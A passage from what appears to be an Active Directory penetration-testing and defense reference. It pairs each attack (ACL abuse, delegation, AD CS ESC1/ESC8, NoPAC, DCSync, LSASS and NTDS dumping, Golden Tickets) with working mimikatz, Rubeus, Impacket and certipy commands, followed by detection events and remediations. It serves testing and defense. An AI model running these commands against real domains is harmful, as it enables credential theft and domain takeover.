$gmsa = Get-ADServiceAccount -Identity svc_web -Properties msDS-ManagedPassword
$mp = $gmsa.'msDS-ManagedPassword'
$secpw = ConvertFrom-ADManagedPasswordBlob $mp
$secpw.CurrentPassword    # plaintext; can derive NTLM
```

**Blue team**

**Origin** — Any host where the allowed-retrieval principal is authenticated. Attack is silent — LDAP attribute read.

**Detect** — Event 4662 on the gMSA object if SACL auditing is configured for `msDS-ManagedPassword`. No built-in alerting otherwise. Behavioral: gMSA credentials used from an unexpected host.

**Close** — Restrict `PrincipalsAllowedToRetrieveManagedPassword` to only the specific hosts/services that need it (never domain computers group, never broad security groups). Audit membership of this attribute quarterly (ADC-018). Prefer gMSA over traditional service accounts but enforce tight retrieval policy.

---

### 3.8 Responder hash capture (standalone)

| | |
|---|---|
| **ATT&CK** | T1557.001 |
| **Phase** | Credential access |
| **Min priv** | Network position |
| **Tools** | Responder |

**Attack vector**
Even without relaying, captured NTLMv2 hashes can be cracked offline if the password is weak. NTLMv2 hashes captured via LLMNR/NBT-NS poisoning are cracked with hashcat mode 5600.

**Commands**
```bash
responder -I eth0 -A               # Analyze mode (passive — don't poison)
responder -I eth0 -wd              # Active poisoning + WPAD

# Crack captured hashes
hashcat -m 5600 responder.hashes /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

**Blue team** — Same controls as §3.4. Additionally: enforce NTLMv2-only (`LmCompatibilityLevel = 5`) so LM/NTLMv1 hashes (trivially crackable) are never sent. Enable NTLM auditing (AUD-015) to log all NTLM authentications.

---

## 4. Domain privilege escalation

---

### 4.1 ACL / ACE abuse

| | |
|---|---|
| **ATT&CK** | T1222.001, T1098 |
| **Phase** | Domain privilege escalation |
| **Min priv** | Domain user with a misconfigured ACE on a target object |
| **Tools** | PowerView, BloodHound, aclpwn, Impacket dacledit |
| **ad-recon findings** | ADC-007, ADC-019 |

**Attack vector**
Active Directory access rights (ACEs) on objects — users, groups, computers, GPOs, OUs — can grant non-admin users the ability to reset passwords, add group members, write attributes, or modify permissions. BloodHound maps these into attack paths. Common high-value ACEs: `GenericAll`, `GenericWrite`, `WriteDACL`, `WriteOwner`, `ForceChangePassword`, `AddMember`.

**How the PTA performs it**
1. Import BloodHound data; query "Shortest paths from owned to Domain Admins."
2. Identify the next-hop ACE (e.g., GenericWrite on a group that has GenericAll on a DA).
3. Abuse each ACE in sequence: force-change a password, add self to a group, write an SPN (targeted Kerberoast), or set `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD).

**Commands**
```powershell
# Force-change another user's password
Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString "NewPass1!" -AsPlainText -Force)

# Add self to a group
Add-DomainGroupMember -Identity "IT Admins" -Members "attacker_user"

# GenericWrite → targeted Kerberoast (add SPN)
Set-DomainObject -Identity target_user -Set @{serviceprincipalname='fake/spn'}
# Then Kerberoast target_user

# WriteDACL → grant self DCSync rights
$acl = Get-ObjectAcl "DC=corp,DC=local"
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

```bash
# Linux — dacledit.py
dacledit.py -action write -rights DCSync -target "DC=corp,DC=local" \
  'corp.local/user:pass' -dc-ip <dc>

# Automated ACL abuse
python3 aclpwn.py -f attacker -t Domain\ Admins -d corp.local -du user -dp pass
```

**Blue team**

**Origin** — Any host authenticated as the account with the misconfigured ACE.

**Detect** — Event 5136 (directory service object modified — attribute change). Event 4728/4729 (member added to/removed from security-enabled global group). Event 4723/4724 (password change/reset). Abnormal group membership change audit trail. BloodHound data itself: run as a blue team tool and query for non-Tier-0 accounts with high-value paths.

**Close** — Regular ACL audits using BloodHound queries or `Get-DomainObjectAcl`. ADC-019 covers AdminSDHolder ACL drift. GPO-013 covers write rights on DC-linked GPOs. ADC-007 covers DCSync rights. Remove unnecessary `WriteDACL`/`WriteOwner`/`GenericAll` from non-admin accounts. Apply Protected Users group to prevent NTLM for DA accounts.

---

### 4.2 Shadow Credentials

| | |
|---|---|
| **ATT&CK** | T1556.006 |
| **Phase** | Domain privilege escalation |
| **Min priv** | Write rights to target's msDS-KeyCredentialLink |
| **Tools** | Whisker, pyWhisker, gettgtpkinit.py |
| **ad-recon finding** | ADC-016 |

**Attack vector**
If an attacker has write access to `msDS-KeyCredentialLink` on a user or computer object, they can add a Key Credential (certificate) that allows PKINIT Kerberos authentication as that object — without knowing the account's password and without changing it. Stealthy: no password reset, no group change.

**How the PTA performs it**
1. Generate a certificate keypair (Whisker does this automatically).
2. Write the certificate's public key material to `msDS-KeyCredentialLink` on the target.
3. Use the private key to perform PKINIT and obtain a TGT as the target account.
4. Use the TGT to pass-the-hash (via `KERB-KEY-LIST`) or operate as the target.

**Commands**
```powershell
# Windows — Whisker
Whisker.exe add /target:victim_user
Whisker.exe add /target:dc01$

# Then use Rubeus with generated certificate
Rubeus.exe asktgt /user:victim_user /certificate:<base64> /password:pfxpass /ptt
```

```bash
# Linux
pyWhisker.py -d corp.local -u attacker -p pass --target victim_user --action add
gettgtpkinit.py corp.local/victim_user -cert-pfx victim_user.pfx -pfx-pass pass victim.ccache
export KRB5CCNAME=victim.ccache
secretsdump.py -k -no-pass corp.local/victim_user@<dc>     # if victim is a DC
```

**Blue team**

**Origin** — Any host authenticated as the account with write rights to `msDS-KeyCredentialLink`.

**Detect** — Event 5136 (attribute modified: `msDS-KeyCredentialLink`). A non-empty `msDS-KeyCredentialLink` on unexpected accounts is the persistent indicator. PKINIT TGT requests (4768 with pre-auth type 17/18) from hosts/users that don't normally use certificate authentication.

**Close** — Audit `msDS-KeyCredentialLink` on all accounts for unexpected values (ADC-016). Restrict write access to this attribute to only PKI/CA service accounts. Monitor 5136 for writes to this attribute on Tier 0 objects. Enable `Smart Card Required` on DA accounts to detect unauthorized PKINIT.

---

### 4.3 Unconstrained Kerberos delegation

| | |
|---|---|
| **ATT&CK** | T1558.003 |
| **Phase** | Domain privilege escalation |
| **Min priv** | Local admin on the delegating host |
| **Tools** | Rubeus, printerbug.py, PetitPotam.py, SpoolSample |
| **ad-recon finding** | ADC-006 |

**Attack vector**
Non-DC computers with `TRUSTED_FOR_DELEGATION` (UAC `0x80000`) cache TGTs of every user who authenticates to a service on that host. If the attacker has admin on that host, they can dump all cached TGTs — including DC machine account TGTs, which enable DCSync.

**How the PTA performs it**
1. Gain local admin on a host with unconstrained delegation (or the host is already compromised).
2. Set up TGT monitoring with Rubeus.
3. Coerce a DC to authenticate to the compromised host using PrinterBug (`MS-RPRN`) or PetitPotam (`MS-EFSRPC`).
4. Capture the DC machine account TGT; use it for DCSync or pass-the-ticket.

**Commands**
```powershell
# Monitor for incoming TGTs on unconstrained host
Rubeus.exe monitor /interval:5 /nowrap

# Coerce (run from any host)
# PrinterBug
SpoolSample.exe <dc-fqdn> <unconstrained-host-fqdn>

# Capture and inject
Rubeus.exe ptt /ticket:<base64-tgt>

# Then DCSync from any host
mimikatz lsadump::dcsync /domain:corp.local /all /csv
```

```bash
# PetitPotam coercion (from Linux)
PetitPotam.py <unconstrained-host-ip> <dc-ip>

# printerbug.py
printerbug.py corp.local/user:pass@<dc-ip> <unconstrained-host-ip>
```

**Blue team**

**Origin** — Attack chain: coerce traffic originates from a host with network reach to the DC's RPC/EFSRPC endpoint (135 + dynamic ports). TGT capture happens on the unconstrained host.

**Detect** — Event 4769 (TGS request) from the compromised host for the DC machine account. Coercion: Event 4648 (explicit credential logon) on the DC indicating it connected to the unconstrained host. PrinterBug: MS-RPRN traffic patterns (RPC to spooler service). Alert on any TGT extraction from LSASS (Event 10 Sysmon / 4656 object access on lsass.exe).

**Close** — Remove `TRUSTED_FOR_DELEGATION` from all non-DC computers (ADC-006). Disable Print Spooler on DCs (HOST-004, GPO-008). Block MS-EFSRPC coercion via Windows Defender Credential Guard or netfilter rules. Require DC-to-server communication only via required service ports.

---

### 4.4 Constrained delegation

| | |
|---|---|
| **ATT&CK** | T1558.003 |
| **Phase** | Domain privilege escalation |
| **Min priv** | Compromise of the delegating service account |
| **Tools** | Rubeus, getST.py |
| **ad-recon finding** | ADC-015 |

**Attack vector**
`msDS-AllowedToDelegateTo` restricts which services the account can delegate to. However, accounts with protocol transition (`TrustedToAuthForDelegation`, S4U2Self) can impersonate **any user** (including Domain Admins) to the target service — even without that user's password.

**How the PTA performs it**
1. Compromise the service account (Kerberoast, credential in attribute, etc.).
2. Use S4U2Self to get a service ticket impersonating a privileged user.
3. Use S4U2Proxy to get a service ticket to the target service as that privileged user.

**Commands**
```powershell
Rubeus.exe s4u /user:svc_app /rc4:<hash> /impersonateuser:Administrator \
  /msdsspn:cifs/fileserver.corp.local /ptt
```

```bash
getST.py -dc-ip <dc> -spn cifs/fileserver.corp.local -impersonate Administrator \
  corp.local/svc_app:<hash> -hashes :<hash>
export KRB5CCNAME=Administrator@cifs_fileserver.corp.local.ccache
smbclient.py -k -no-pass corp.local/Administrator@fileserver
```

**Blue team**

**Origin** — Any host the service account is authenticated on.

**Detect** — Event 4769 showing S4U2Self (service ticket to self) or S4U2Proxy requests. Look for TGS requests where the `ClientName` differs from the `ServiceName` in unexpected ways. Rubeus S4U leaves a characteristic event sequence.

**Close** — Remove protocol transition (`TrustedToAuthForDelegation`) unless genuinely required. Replace constrained delegation with Resource-Based Constrained Delegation where possible (easier to manage). Enforce strong passwords on all service accounts with delegation rights (ADC-015).

---

### 4.5 Resource-Based Constrained Delegation (RBCD)

| | |
|---|---|
| **ATT&CK** | T1098 |
| **Phase** | Domain privilege escalation |
| **Min priv** | Write rights to target computer's msDS-AllowedToActOnBehalfOfOtherIdentity + a computer account (or MAQ > 0) |
| **Tools** | Powermad, PowerView, Rubeus, rbcd.py, addcomputer.py, getST.py |
| **ad-recon findings** | ADC-014, ADC-001 |

**Attack vector**
If an attacker has `GenericWrite`, `GenericAll`, or `WriteProperty` on a computer object, they can set `msDS-AllowedToActOnBehalfOfOtherIdentity` to point to any account they control. Combined with a machine account (or if `MachineAccountQuota > 0` allowing creation of one), they can then impersonate any user to that computer.

**How the PTA performs it**
1. Create a machine account (if MAQ > 0) using Powermad.
2. Set `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer to the new machine account.
3. Use S4U to get a service ticket as Domain Admin to the target.

**Commands**
```powershell
# Step 1: Create machine account (requires MAQ > 0)
Import-Module Powermad
New-MachineAccount -MachineAccount "FakeMachine" -Password (ConvertTo-SecureString "Pass@123" -AsPlainText -Force)

# Step 2: Set RBCD
$sid = Get-DomainComputer FakeMachine -Properties objectsid | Select-Object -ExpandProperty objectsid
$sddl = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
$sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $sddl
$sdBytes = New-Object byte[] ($sd.BinaryLength)
$sd.GetBinaryForm($sdBytes, 0)
Set-DomainObject -Identity target_computer -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sdBytes}

# Step 3: S4U
Rubeus.exe s4u /user:FakeMachine$ /rc4:<hash> /impersonateuser:Administrator \
  /msdsspn:cifs/target_computer.corp.local /ptt
```

```bash
# Linux all-in-one
addcomputer.py -computer-name FakeMachine -computer-pass FakePass123 corp.local/user:pass -dc-ip <dc>
rbcd.py -delegate-from FakeMachine$ -delegate-to target_computer$ -action write corp.local/user:pass -dc-ip <dc>
getST.py -spn cifs/target_computer.corp.local -impersonate Administrator \
  corp.local/FakeMachine$:FakePass123 -dc-ip <dc>
```

**Blue team**

**Origin** — The host where the account with write rights to the computer object is authenticated.

**Detect** — Event 5136 (attribute modified: `msDS-AllowedToActOnBehalfOfOtherIdentity`). Event 4741 (new computer account created — flag if from a non-admin source). Event 4769 (S4U Kerberos service ticket requests).

**Close** — Set `MachineAccountQuota = 0` (ADC-001). Audit and remove `GenericWrite`/`GenericAll` on computer objects from non-admin accounts (BloodHound query). Monitor Event 5136 for writes to `msDS-AllowedToActOnBehalfOfOtherIdentity`.

---

### 4.6 AD Certificate Services — ESC1–ESC16

| | |
|---|---|
| **ATT&CK** | T1649 |
| **Phase** | Domain privilege escalation → Domain dominance |
| **Min priv** | Varies by ESC: ESC1/3/8 = any enrollee; ESC4/5/7 = object write rights |
| **Tools** | Certipy, Certify, ntlmrelayx |
| **ad-recon findings** | ADCS-001 through ADCS-013 |

**Attack vector**
AD CS misconfigurations let attackers forge authentication certificates for any user, impersonate DAs, or relay NTLM authentication to the CA. The ESC numbering system (Specterops research) catalogs 16+ distinct attack paths.

**How the PTA performs it — ESC1 (most common)**
1. Find a template allowing enrollee-supplied SAN, Client Authentication EKU, no manager approval, and broad enrollment rights.
2. Request a certificate specifying `administrator@corp.local` as the Subject Alternative Name.
3. Use the certificate for PKINIT Kerberos to obtain a DA TGT.

**How the PTA performs it — ESC8 (NTLM relay)**
1. Confirm HTTP (non-HTTPS) enrollment endpoint (`/certsrv`).
2. Coerce a DC to authenticate (PrinterBug/PetitPotam).
3. Relay the DC machine account NTLM auth to the CA's web enrollment.
4. Receive a DC certificate; extract the NTLM hash via PKINIT.

**Commands**
```bash
# Enumeration
certipy find -u user@corp.local -p pass -dc-ip <dc> -vulnerable -stdout

# ESC1 exploitation
certipy req -ca <CA-name> -template <vuln-template> -upn administrator@corp.local \
  -u user@corp.local -p pass -dc-ip <dc>
certipy auth -pfx administrator.pfx -dc-ip <dc>

# ESC8 — relay
certipy relay -target http://<ca-host>/certsrv/certfnsh.asp -template DomainController

# ESC6 — CA has EDITF_ATTRIBUTESUBJECTALTNAME2
certipy req -ca <CA-name> -template User -upn administrator@corp.local \
  -u user@corp.local -p pass -dc-ip <dc>
```

```powershell
# Windows
Certify.exe find /vulnerable
Certify.exe request /ca:<CA> /template:<vuln> /altname:administrator
Rubeus.exe asktgt /user:administrator /certificate:<pfx-b64> /password:pass /ptt
```

**Blue team**

**Origin** — Any host with LDAP access (template enumeration) and access to the CA (certificate request). ESC8 relay requires network position between DC and CA.

**Detect** — Event 4886 (certificate requested), 4887 (certificate issued) — audit these on the CA. Flag certificate requests where the `Subject` or `SubjectAltName` differs from the requesting account's UPN. Event 4768 with pre-auth type 17/18 (PKINIT) from unexpected hosts. CA enrollment anomalies: requests for `DomainController` template from non-DC accounts.

**Close** — Run Locksmith and Certipy findings (ADCS-001 through ADCS-013). Key remediations: require manager approval on templates with broad enrollment + Client Auth EKU. Remove `EDITF_ATTRIBUTESUBJECTALTNAME2` flag from CAs (ADCS-010). Enforce HTTPS on enrollment endpoints (ADCS-001, ADCS-011). Require EPA on web enrollment. Ensure DCs have valid DC auth certificates (ADCS-013).

---

### 4.7 NoPAC (CVE-2021-42278 / CVE-2021-42287)

| | |
|---|---|
| **ATT&CK** | T1134.005 |
| **Phase** | Domain privilege escalation |
| **Min priv** | Any valid domain user (if MachineAccountQuota > 0) |
| **Tools** | noPac.py, sam_the_admin.py |
| **ad-recon finding** | ADC-001 |

**Attack vector**
CVE-2021-42278 allows setting a machine account's `samAccountName` to match a DC's name (without the trailing `$`). CVE-2021-42287 causes the KDC to issue a TGS with DC-level PAC when the machine account is renamed back and a service ticket is requested. Combined: any domain user with MAQ > 0 can escalate to DA on unpatched DCs.

**Commands**
```bash
# Full exploitation
noPac.py corp.local/user:pass -dc-ip <dc> -shell --impersonate administrator

# Dump with noPac
noPac.py corp.local/user:pass -dc-ip <dc> --dump -just-dc-user krbtgt
```

**Blue team**

**Origin** — Any domain-joined or domain-authenticated host. Requires MAQ > 0 and unpatched DCs (pre-Nov 2021 patch).

**Detect** — Event 4741 (computer account created), 4742 (computer account changed — specifically `samAccountName` changed to DC name then back). Event 4768/4769 anomaly where a machine account requests tickets inconsistent with its class. Patch level is the primary indicator.

**Close** — Patch DCs (KB5008102 / KB5008380). Set `MachineAccountQuota = 0` (ADC-001) as defense-in-depth even after patching.

---

## 5. Lateral movement

---

### 5.1 Pass-the-Hash

| | |
|---|---|
| **ATT&CK** | T1550.002 |
| **Phase** | Lateral movement |
| **Min priv** | Valid NTLM hash for a local/domain account with access to the target |
| **Tools** | netexec, psexec.py, wmiexec.py, evil-winrm |

**Attack vector**
NTLM authentication uses a challenge-response where the hash — not the plaintext password — is the secret. Any captured NTLM hash can be used directly for SMB, WMI, WinRM, and HTTP NTLM authentication without cracking. Local Administrator hash reuse across hosts (before LAPS) is the primary lateral movement vehicle.

**How the PTA performs it**
1. Capture NTLM hashes via LSASS dump, Responder, secretsdump, or GPP cpassword recovery.
2. Authenticate to target hosts using the hash directly.
3. Identify which hosts accept the hash (especially if local admin hash is reused).

**Commands**
```bash
# SMB authentication
netexec smb <subnet>/24 -u Administrator -H <NTLM-hash> --local-auth
netexec smb <subnet>/24 -u Administrator -H <NTLM-hash> --local-auth -x whoami

# Remote execution
psexec.py -hashes :<NTLM> corp.local/admin@<target>
wmiexec.py -hashes :<NTLM> corp.local/admin@<target>
evil-winrm -i <target> -u admin -H <NTLM>

# Validate scope of hash reuse
netexec smb <subnet>/24 -u Administrator -H <NTLM> --local-auth --continue-on-success
```

**Blue team**

**Origin** — Anywhere the hash is used. Originates from attacker-controlled host. NTLM logon (type 3) from a source that doesn't normally authenticate to the target.

**Detect** — Event 4624 (logon type 3 or 9) with NTLM as the authentication package; compare source workstation against expected patterns. Event 4776 (NTLM credential validation on DC). Behavioral: admin hash used from a non-admin workstation. Look for `psexec` service installation (Event 7045) or scheduled task (4698) creation immediately after logon.

**Close** — Deploy LAPS to ensure unique local Administrator passwords per host (ADC-034). Disable the built-in Administrator account or rename it (ADC-037). Enable Windows Defender Remote Credential Guard or Restricted Admin mode. Enable NTLM auditing (AUD-015). Block NTLM where possible; enforce Kerberos-only for privileged access paths.

---

### 5.2 Pass-the-Ticket / OverPass-the-Hash

| | |
|---|---|
| **ATT&CK** | T1550.003 |
| **Phase** | Lateral movement |
| **Min priv** | Valid Kerberos ticket or NTLM hash (to forge TGT) |
| **Tools** | Rubeus, mimikatz, ticketer.py |

**Attack vector**
Kerberos tickets (TGTs and TGSs) are stored in LSASS memory and can be extracted and reused — even across different machines. Alternatively, an NTLM hash can be used to request a genuine TGT (OverPass-the-Hash/Pass-the-Key), which is then used for Kerberos authentication — evading NTLM-based detection.

**Commands**
```powershell
# Extract tickets from LSASS
mimikatz sekurlsa::tickets /export
Rubeus.exe dump /nowrap

# Inject ticket into current session
Rubeus.exe ptt /ticket:<base64>
mimikatz kerberos::ptt C:\ticket.kirbi

# OverPass-the-Hash (NTLM hash → Kerberos TGT)
Rubeus.exe asktgt /user:svc_sql /rc4:<NTLM-hash> /ptt
mimikatz sekurlsa::pth /user:svc_sql /domain:corp.local /ntlm:<hash> /run:cmd.exe
```

```bash
# Linux — use ccache
export KRB5CCNAME=/tmp/ticket.ccache
smbclient.py -k corp.local/admin@<target>
wmiexec.py -k -no-pass corp.local/admin@<target>
```

**Blue team**

**Origin** — The host where the ticket is extracted; then any host the ticket is injected into.

**Detect** — Event 4769 (TGS request) from an unexpected host for an account whose home workstation is different. Rubeus dump creates LSASS access (Event 10 Sysmon, Event 4656 object access on lsass.exe). Injected tickets from different IPs than the ticket's origin IP may trigger PAC validation failures (Event 4769 with failure code `0x24`).

**Close** — Enable LSASS RunAsPPL (HOST-008) to prevent LSASS memory reads. Deploy Credential Guard to prevent Kerberos credential extraction. Set short Kerberos TGT lifetime (default 10h is fine; protect krbtgt with double rotation — ADC-003). Enforce AES-only Kerberos to prevent RC4 ticket forging.

---

### 5.3 Token impersonation (SeImpersonatePrivilege)

| | |
|---|---|
| **ATT&CK** | T1134.001 |
| **Phase** | Lateral movement / privilege escalation |
| **Min priv** | Local service account with SeImpersonatePrivilege |
| **Tools** | PrintSpoofer, RoguePotato, GodPotato, mimikatz token::elevate |

**Attack vector**
Service accounts (IIS, SQL, web apps) typically have `SeImpersonatePrivilege`. An attacker with code execution as such a service account can impersonate `SYSTEM` or other higher-privileged tokens using named pipe or COM impersonation tricks (Potato family of exploits).

**Commands**
```powershell
# Check current privileges
whoami /priv

# PrintSpoofer (requires SeImpersonate, Windows 10+/Server 2016+)
PrintSpoofer.exe -i -c cmd.exe

# RoguePotato / GodPotato
RoguePotato.exe -r <attacker-ip> -e "cmd.exe"
GodPotato.exe -cmd "cmd /c whoami"

# mimikatz token elevation
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords    # dump after elevation
```

**Blue team**

**Origin** — Local on the compromised host running the service account.

**Detect** — Event 4624 logon type 5 (service) followed immediately by type 2 (interactive) or type 9 (new credentials) from the same host. Named pipe creation from service account processes (Sysmon Event 17/18). Process ancestry anomalies: web server process spawning `cmd.exe`.

**Close** — Run IIS, SQL, and web applications as dedicated service accounts without unnecessary privileges. Use gMSA where possible. Remove `SeImpersonatePrivilege` from service accounts where not required (rarely possible for IIS/SQL built-in accounts — mitigate with WDAC/AppLocker to prevent Potato tools). Isolate service accounts from each other and from admin accounts.

---

### 5.4 Remote execution (PSExec / WMI / DCOM / WinRM)

| | |
|---|---|
| **ATT&CK** | T1021.002, T1021.006, T1047, T1569.002 |
| **Phase** | Lateral movement |
| **Min priv** | Local admin on target |
| **Tools** | psexec.py, wmiexec.py, dcomexec.py, evil-winrm, Invoke-Command |

**Attack vector**
With local admin access (via pass-the-hash, cracked credentials, or token impersonation), an attacker can execute commands or get a shell on remote hosts via SMB service creation, WMI, DCOM, or WinRM — each with different detection signatures.

**Commands**
```bash
# SMB/psexec — creates ADMIN$ service (noisiest)
psexec.py corp.local/admin:pass@<target>
psexec.py -hashes :<NTLM> corp.local/admin@<target>

# WMI — no service created (stealthier)
wmiexec.py corp.local/admin:pass@<target> "whoami"

# DCOM
dcomexec.py corp.local/admin:pass@<target> whoami

# WinRM (requires port 5985/5986)
evil-winrm -i <target> -u admin -p pass
evil-winrm -i <target> -u admin -H <NTLM>
```

```powershell
# PowerShell remoting
Invoke-Command -ComputerName target -ScriptBlock { whoami } -Credential (Get-Credential)
$s = New-PSSession -ComputerName target -Credential $cred
Enter-PSSession $s
```

**Blue team**

**Origin** — Attacker-controlled host with network access to target (445 for SMB/WMI/DCOM, 5985/5986 for WinRM).

**Detect** — PSExec: Event 7045 (service installation named `PSEXESVC`) + 4624 logon. WMI: Event 4624 (logon type 3) + WMI activity log (Microsoft-Windows-WMI-Activity/Operational). DCOM: Event 4624 + DCOM activation events. WinRM: Event 4624 logon type 3 (network) or 10 (remote interactive) with `WinRM` as auth source. All: look for admin connecting from unexpected workstation.

**Close** — Restrict admin-to-admin connectivity: block lateral SMB/WMI between workstations (Windows Firewall policy). Require jump hosts for server administration. Disable WinRM where not needed. Enable Constrained Language Mode in PowerShell via AppLocker/WDAC. Audit local admin group membership on workstations (GPO-012 / Restricted Groups).

---

## 6. Domain dominance & persistence

---

### 6.1 DCSync

| | |
|---|---|
| **ATT&CK** | T1003.006 |
| **Phase** | Domain dominance |
| **Min priv** | DS-Replication-Get-Changes + DS-Replication-Get-Changes-All rights |
| **Tools** | secretsdump.py, mimikatz |
| **ad-recon finding** | ADC-007 |

**Attack vector**
Domain controllers replicate password hashes using the Directory Replication Service (DRS) protocol. Any principal granted `DS-Replication-Get-Changes-All` on the domain head can impersonate a DC and pull all password hashes — without touching LSASS, without logging on to a DC, without needing a service. This is the most common final-stage privilege escalation in a compromised domain.

**How the PTA performs it**
1. Verify the compromised account has DCSync rights (or grant them via WriteDACL on the domain object).
2. Initiate a DRS replication request targeting the `krbtgt` account or all accounts.
3. Collect NTLM hashes for all domain accounts; use for pass-the-hash or golden ticket.

**Commands**
```bash
# Linux
secretsdump.py corp.local/admin:pass@<dc>
secretsdump.py -hashes :<NTLM> corp.local/admin@<dc>
secretsdump.py corp.local/admin:pass@<dc> -just-dc-user krbtgt    # krbtgt only
secretsdump.py corp.local/admin:pass@<dc> -just-dc-ntlm           # hashes only, faster
```

```powershell
# mimikatz
mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt
mimikatz lsadump::dcsync /domain:corp.local /all /csv
```

**Blue team**

**Origin** — Any host where the account with DCSync rights is authenticated. No DC logon required — the attack uses DRS over port 135 + dynamic RPC from any host to any DC.

**Detect** — Event 4662 (directory object access) with GUIDs `{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}` (Get-Changes) and `{1131f6ab-9c07-11d1-f79f-00c04fc2dcd2}` (Get-Changes-All) for the domain root object, from a source that is **not a DC**. This is a tier-1 detection rule — virtually no false positives when filtered to non-DC sources.

**Close** — Enumerate all principals with DCSync rights and remove any non-DC account (ADC-007). Use BloodHound to find paths that grant WriteDACL on the domain head. Monitor for Exchange Windows Permissions group changes (ADC-042 — Exchange deployments often add this). Enable Advanced Audit → DS Access → Directory Service Access.

---

### 6.2 NTDS.dit extraction

| | |
|---|---|
| **ATT&CK** | T1003.003 |
| **Phase** | Domain dominance |
| **Min priv** | Local admin on a DC |
| **Tools** | ntdsutil, diskshadow, vssadmin, secretsdump |
| **ad-recon finding** | HOST-032 |

**Attack vector**
`NTDS.dit` on a DC contains all password hashes in the domain. It is locked while AD is running, but VSS (Volume Shadow Copy Service) allows taking a point-in-time snapshot — readable without stopping the database. Backup Operators can trigger VSS even without Domain Admin.

**How the PTA performs it**
1. On the DC, create a VSS snapshot of the system drive.
2. Extract NTDS.dit and SYSTEM hive from the snapshot.
3. Transfer offline; use secretsdump to extract all hashes locally.

**Commands**
```powershell
# Method 1 — ntdsutil (IFM copy, creates clean export)
ntdsutil "activate instance ntds" "ifm" "create full C:\temp\ntds" quit quit

# Method 2 — VSS / diskshadow
diskshadow /s C:\shadow.dsh     # script file: set context persistent, add volume C: alias ntds, create, expose %ntds% Z:
copy Z:\Windows\NTDS\ntds.dit C:\temp\
reg save HKLM\SYSTEM C:\temp\system.hive

# Method 3 — vssadmin
vssadmin create shadow /for=C:
# Then copy from shadow path
```

```bash
# Offline extraction on attacker box
secretsdump.py -ntds ntds.dit -system system.hive -outputfile all_hashes LOCAL
```

**Blue team**

**Origin** — Local on the DC. Requires console or RDP/WinRM access to the DC.

**Detect** — Event 4688 (process creation) for `ntdsutil.exe`, `diskshadow.exe`, `vssadmin.exe` on a DC. Sysmon Event 1 (process create) for the same. VSS snapshot creation (Event 8222 in System log). File access to `\Windows\NTDS\ntds.dit` outside the AD database service. Network: large file transfer off DC after one of the above.

**Close** — Restrict DC console/RDP access to Tier-0 accounts only (GPO-014 — deny logon rights). Restrict Backup Operators group membership. Monitor `ntdsutil`, `diskshadow`, `vssadmin` process creation on DCs via Sysmon. Enable BitLocker on DC OS volumes (HOST-027) to protect against physical theft. HOST-032 flags absence of legitimate backups (which normalizes VSS activity).

---

### 6.3 LSASS memory dumping

| | |
|---|---|
| **ATT&CK** | T1003.001 |
| **Phase** | Domain dominance |
| **Min priv** | Local admin on target |
| **Tools** | mimikatz, comsvcs.dll, procdump, nanodump |
| **ad-recon findings** | HOST-008, HOST-022 |

**Attack vector**
LSASS holds plaintext credentials (if WDigest enabled), NTLM hashes, and Kerberos tickets in memory. Local admin can read LSASS memory via standard Windows APIs (`MiniDumpWriteDump`) or directly via process handle. WDigest caching (HOST-009) makes this critical — it returns plaintext passwords on older Windows versions.

**Commands**
```powershell
# mimikatz (inline — requires SeDebugPrivilege)
mimikatz sekurlsa::logonpasswords
mimikatz sekurlsa::wdigest        # plaintext if WDigest enabled

# comsvcs.dll (LOLBin — no tools needed)
tasklist | findstr lsass           # get PID
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <lsass-pid> C:\temp\lsass.dmp full

# procdump (Sysinternals — signed tool, bypasses some AV)
procdump.exe -ma lsass.exe lsass.dmp
```

```bash
# Parse offline
pypykatz lsa minidump lsass.dmp
```

**Blue team**

**Origin** — Local on the target host. Requires local admin or SeDebugPrivilege.

**Detect** — Sysmon Event 10 (process access to lsass.exe with `ReadVirtualMemory` access right). Event 4656 (object access — lsass.exe). `comsvcs.dll` invocation via `rundll32.exe` is a well-known LOLBin — Event 4688/Sysmon 1. Procdump: known hash; EDR should flag.

**Close** — Enable LSASS RunAsPPL (HOST-008): `reg add HKLM\SYSTEM\...\Lsa /v RunAsPPL /t REG_DWORD /d 1` via GPO. Deploy Credential Guard (HOST-022) — prevents NTLM hash and Kerberos key extraction entirely. Disable WDigest (HOST-009/GPO-003). Restrict debug privilege (`SeDebugPrivilege`) to only SYSTEM.

---

### 6.4 Golden Ticket

| | |
|---|---|
| **ATT&CK** | T1558.001 |
| **Phase** | Domain dominance / persistence |
| **Min priv** | krbtgt NTLM hash (requires DCSync or NTDS dump) |
| **Tools** | mimikatz, ticketer.py |
| **ad-recon finding** | ADC-003 |

**Attack vector**
The `krbtgt` account's NTLM hash is used by DCs to sign all Kerberos TGTs. With it, an attacker can forge a TGT for any user, any group membership, any lifetime — bypassing the KDC entirely. A golden ticket persists even after password resets of other accounts; only rotating `krbtgt` twice (with time between) invalidates it.

**Commands**
```powershell
# Create golden ticket (requires domain SID + krbtgt hash from DCSync)
mimikatz kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-... /krbtgt:<hash> /ptt

# Specify fake group memberships
mimikatz kerberos::golden /user:attacker /domain:corp.local /sid:S-1-5-21-... \
  /krbtgt:<hash> /groups:512,519 /ptt    # 512=DA, 519=EA
```

```bash
ticketer.py -nthash <krbtgt-hash> -domain-sid S-1-5-21-... -domain corp.local \
  -groups 512,519 Administrator
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass corp.local/Administrator@<dc>
```

**Blue team**

**Origin** — Any host. The ticket is presented to any DC during normal Kerberos authentication — no logon to the DC required.

**Detect** — Event 4624 logon with a TGT whose lifetime exceeds the domain maximum (golden tickets often set 10-year lifetime). Event 4769 with an anomalous `EncryptionType`. Microsoft ATA/Defender for Identity can detect golden ticket usage by tracking PAC validation failures. Key indicator: TGT used from a host that has no corresponding 4768 (TGT request) on the DC.

